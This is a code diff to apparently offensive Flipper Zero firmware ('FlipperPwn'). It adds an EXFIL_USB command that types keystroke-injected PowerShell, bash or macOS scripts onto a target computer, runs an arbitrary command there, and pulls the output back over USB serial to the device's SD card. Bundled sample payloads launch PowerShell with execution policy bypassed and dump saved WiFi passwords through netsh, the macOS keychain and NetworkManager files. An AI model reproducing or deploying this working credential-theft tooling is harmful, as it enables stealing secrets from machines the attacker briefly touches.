@@ -21,10 +21,26 @@
 #include "flipperpwn.h"
 #include "wifi_uart.h"
 #include "marauder.h"
+#include <furi_hal_usb_cdc.h>
 #include <string.h>
 #include <stdlib.h>
 
 #define TAG "FPwn"
+
+/* =========================================================================
+ * USB CDC exfiltration — ISR-safe flags for the rx_ep_callback
+ * ========================================================================= */
+static volatile bool s_cdc_rx_pending = false;
+
+static void fpwn_cdc_rx_callback(void* context) {
+    UNUSED(context);
+    s_cdc_rx_pending = true;
+}
+
+static void fpwn_cdc_state_callback(void* context, CdcState state) {
+    UNUSED(context);
+    UNUSED(state);
+}
 
 /* Persists the most-recently executed non-REPEAT command for REPEAT <n> */
 static char s_last_command[FPWN_MAX_LINE_LEN];
@@ -2058,6 +2074,226 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
                 app->execute_view,
                 FPwnExecModel * m,
                 { strncpy(m->status, "Exfil: no data received", sizeof(m->status) - 1); },
+                true);
+        }
+
+        return;
+    }
+
+    /* ---- EXFIL_USB <command> ----
+     * High-bandwidth exfiltration via USB CDC serial (~115200 baud).
+     *
+     * Phase 1 (HID): Types a script that (a) runs <command> and buffers output,
+     *   (b) snapshots existing serial ports, (c) polls for a NEW serial port
+     *   (the Flipper re-enumerating as CDC) and writes the buffered data + EOT.
+     * Phase 2 (Delay): Waits EXFIL_USB_DELAY ms (default 5000) for the target
+     *   script to finish executing and snapshot existing ports.
+     * Phase 3 (Switch): Switches USB from HID to CDC single and sets callbacks.
+     * Phase 4 (Receive): Polls furi_hal_cdc_receive() until EOT (0x04) or timeout.
+     * Phase 5 (Restore): Switches back to HID, saves data to SD card.
+     *
+     * Configurable via variables:
+     *   SET EXFIL_USB_DELAY  <ms>   — pre-switch delay (default 5000, min 1000, max 30000)
+     *   SET EXFIL_USB_TIMEOUT <ms>  — receive timeout (default 20000, min 5000, max 60000)
+     */
+    if(strncmp(line, "EXFIL_USB ", 10) == 0) {
+        const char* cmd = line + 10;
+        FPwnOS os = fpwn_effective_os(app);
+
+        /* Allocate receive buffer if not already present */
+        if(!app->exfil_buffer) {
+            app->exfil_buffer = malloc(FPWN_EXFIL_MAX);
+            app->exfil_capacity = FPWN_EXFIL_MAX;
+        }
+        app->exfil_len = 0;
+        memset(app->exfil_buffer, 0, app->exfil_capacity);
+
+        /* Phase 1: Type OS-specific exfil-via-serial script.
+         * The script runs the command, captures output, snapshots existing serial
+         * ports, then polls until a new port appears (the Flipper CDC device). */
+        if(os == FPwnOSWindows) {
+            /* PowerShell: capture output, snapshot COM ports, poll for new one,
+             * open serial port, write data + EOT byte, close. */
+            fpwn_type_string("$_t=[IO.Ports.SerialPort]; "
+                             "$_d=(");
+            fpwn_type_string(cmd);
+            fpwn_type_string(")|Out-String; "
+                             "$_p=$_t::GetPortNames(); "
+                             "1..40|%{sleep -m 500; "
+                             "$_n=$_t::GetPortNames()|?{$_ -notin $_p}; "
+                             "if($_n){"
+                             "$_s=$_t::new($_n[0],115200); "
+                             "$_s.Open(); "
+                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
+                             "$_s.Write($_b,0,$_b.Length); "
+                             "$_s.Close(); break}}");
+        } else if(os == FPwnOSLinux) {
+            /* Bash: capture output, snapshot /dev/ttyACM*, poll for new device,
+             * configure with stty, write data + EOT. */
+            fpwn_type_string("_d=$(");
+            fpwn_type_string(cmd);
+            fpwn_type_string(" 2>&1); "
+                             "_p=$(ls -1 /dev/ttyACM* 2>/dev/null); "
+                             "for _i in $(seq 40); do sleep .5; "
+                             "for _v in /dev/ttyACM*; do [ -c \"$_v\" ] || continue; "
+                             "echo \"$_p\"|grep -qxF \"$_v\" && continue; "
+                             "stty -F \"$_v\" 115200 raw -echo 2>/dev/null && "
+                             "{ printf '%s\\004' \"$_d\" > \"$_v\"; break 2; }; "
+                             "done; done");
+        } else if(os == FPwnOSMac) {
+            /* macOS: same as Linux but /dev/cu.usbmodem* and stty -f */
+            fpwn_type_string("_d=$(");
+            fpwn_type_string(cmd);
+            fpwn_type_string(" 2>&1); "
+                             "_p=$(ls -1 /dev/cu.usbmodem* 2>/dev/null); "
+                             "for _i in $(seq 40); do sleep .5; "
+                             "for _v in /dev/cu.usbmodem*; do [ -c \"$_v\" ] || continue; "
+                             "echo \"$_p\"|grep -qxF \"$_v\" && continue; "
+                             "stty -f \"$_v\" 115200 raw 2>/dev/null && "
+                             "{ printf '%s\\004' \"$_d\" > \"$_v\"; break 2; }; "
+                             "done; done");
+        }
+
+        /* Press Enter to launch the script on the target */
+        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+
+        /* Phase 2: Baked-in delay — lets the target script execute the command
+         * and snapshot existing ports BEFORE we switch USB modes. */
+        uint32_t switch_delay = 5000;
+        {
+            const char* dv = fpwn_var_get("EXFIL_USB_DELAY");
+            if(dv) switch_delay = (uint32_t)atoi(dv);
+            if(switch_delay < 1000) switch_delay = 1000;
+            if(switch_delay > 30000) switch_delay = 30000;
+        }
+
+        FURI_LOG_I(
+            TAG, "EXFIL_USB: waiting %lu ms before CDC switch", (unsigned long)switch_delay);
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "Running cmd on target...", sizeof(m->status) - 1); },
+            true);
+
+        /* Wait in 100 ms increments so abort is responsive */
+        for(uint32_t w = 0; w < switch_delay && !app->abort_requested; w += 100) {
+            furi_delay_ms(100);
+        }
+        if(app->abort_requested) return;
+
+        /* Phase 3: Switch USB from HID to CDC single */
+        FURI_LOG_I(TAG, "EXFIL_USB: switching to CDC");
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "CDC mode - receiving...", sizeof(m->status) - 1); },
+            true);
+
+        s_cdc_rx_pending = false;
+
+        furi_hal_usb_unlock();
+        furi_hal_usb_set_config(&usb_cdc_single, NULL);
+        furi_delay_ms(100); /* Let USB stack settle */
+
+        CdcCallbacks cdc_cb = {
+            .tx_ep_callback = NULL,
+            .rx_ep_callback = fpwn_cdc_rx_callback,
+            .state_callback = fpwn_cdc_state_callback,
+            .ctrl_line_callback = NULL,
+            .config_callback = NULL,
+        };
+        furi_hal_cdc_set_callbacks(0, &cdc_cb, app);
+
+        /* Phase 4: Receive loop — poll CDC until EOT or timeout */
+        uint32_t rx_timeout = 20000;
+        {
+            const char* tv = fpwn_var_get("EXFIL_USB_TIMEOUT");
+            if(tv) rx_timeout = (uint32_t)atoi(tv);
+            if(rx_timeout < 5000) rx_timeout = 5000;
+            if(rx_timeout > 60000) rx_timeout = 60000;
+        }
+
+        uint32_t rx_start = furi_get_tick();
+        bool got_eot = false;
+
+        while(!app->abort_requested && !got_eot) {
+            if(furi_get_tick() - rx_start > furi_ms_to_ticks(rx_timeout)) {
+                FURI_LOG_W(TAG, "EXFIL_USB: timeout, %lu bytes", (unsigned long)app->exfil_len);
+                break;
+            }
+
+            if(s_cdc_rx_pending) {
+                s_cdc_rx_pending = false;
+                uint8_t rxbuf[CDC_DATA_SZ];
+                int32_t rxlen = furi_hal_cdc_receive(0, rxbuf, CDC_DATA_SZ);
+                for(int32_t ri = 0; ri < rxlen && !got_eot; ri++) {
+                    if(rxbuf[ri] == 0x04) {
+                        got_eot = true;
+                        FURI_LOG_I(
+                            TAG, "EXFIL_USB: EOT, %lu bytes", (unsigned long)app->exfil_len);
+                    } else if(app->exfil_len < app->exfil_capacity - 1) {
+                        app->exfil_buffer[app->exfil_len++] = (char)rxbuf[ri];
+                        app->exfil_buffer[app->exfil_len] = '\0';
+                    }
+                }
+            }
+
+            furi_delay_ms(5); /* Yield — 5 ms poll is plenty for 115200 baud */
+        }
+
+        /* Unregister CDC callbacks before switching back */
+        furi_hal_cdc_set_callbacks(0, NULL, NULL);
+
+        /* Phase 5: Switch back to HID */
+        FURI_LOG_I(TAG, "EXFIL_USB: switching back to HID");
+        furi_hal_usb_unlock();
+        furi_hal_usb_set_config(&usb_hid, NULL);
+        furi_delay_ms(2000); /* Wait for HID re-enumeration on target */
+
+        /* Update UI with result */
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            {
+                snprintf(
+                    m->status,
+                    sizeof(m->status),
+                    "USB exfil: %lu bytes",
+                    (unsigned long)app->exfil_len);
+            },
+            true);
+
+        /* Save received data to SD card */
+        if(app->exfil_len > 0) {
+            storage_simply_mkdir(app->storage, FPWN_EXFIL_DIR);
+
+            char exfil_path[128];
+            uint32_t ts = furi_get_tick() / 1000;
+            snprintf(
+                exfil_path,
+                sizeof(exfil_path),
+                "%s/exfil_usb_%lu.txt",
+                FPWN_EXFIL_DIR,
+                (unsigned long)ts);
+
+            File* ef = storage_file_alloc(app->storage);
+            if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
+                storage_file_close(ef);
+                FURI_LOG_I(
+                    TAG,
+                    "EXFIL_USB: saved %lu bytes to %s",
+                    (unsigned long)app->exfil_len,
+                    exfil_path);
+            }
+            storage_file_free(ef);
+        } else {
+            with_view_model(
+                app->execute_view,
+                FPwnExecModel * m,
+                { strncpy(m->status, "USB exfil: no data received", sizeof(m->status) - 1); },
                 true);
         }
 
@@ -4555,6 +4791,80 @@ static const char SAMPLE_QUICK_EXFIL[] =
     "LED_COLOR GREEN\n"
     "PRINT Recon saved to {{FILENAME}}\n";
 
+/* WiFi Credential Dump (USB CDC) — high-bandwidth version of wifi_creds.fpwn */
+static const char SAMPLE_WIFI_CREDS_USB[] =
+    "NAME WiFi Creds (USB)\n"
+    "DESCRIPTION Extracts saved WiFi passwords; exfils via USB CDC serial (~115200 baud)\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "OPTION EXFIL_USB_DELAY 5000 \"Delay before USB CDC switch (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL_USB (netsh wlan show profiles) | Select-String '\\:(.+)$' | "
+    "%{$n=$_.Matches.Groups[1].Value.Trim(); $_} | "
+    "%{(netsh wlan show profile name=\"$n\" key=clear)} | "
+    "Select-String 'Key Content\\W+\\:(.+)$' | "
+    "%{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL_USB for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | "
+    "tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); "
+    "echo \"WIFI: $ssid = $pw\"; done\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL_USB sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || "
+    "nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | "
+    "sed 's/:/: /'\n";
+
+/* USB Exfil Test — simple hostname exfil to verify the EXFIL_USB pipeline */
+static const char SAMPLE_USB_EXFIL_TEST[] =
+    "NAME USB Exfil Test\n"
+    "DESCRIPTION Tests USB CDC exfiltration by capturing hostname\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "OPTION EXFIL_USB_DELAY 3000 \"Delay before USB CDC switch (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL_USB hostname\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL_USB hostname\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL_USB hostname\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -4697,4 +5007,10 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/quick_exfil.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_QUICK_EXFIL);
+
+    snprintf(path, sizeof(path), "%s/wifi_creds_usb.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_CREDS_USB);
+
+    snprintf(path, sizeof(path), "%s/usb_exfil_test.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_USB_EXFIL_TEST);
 }
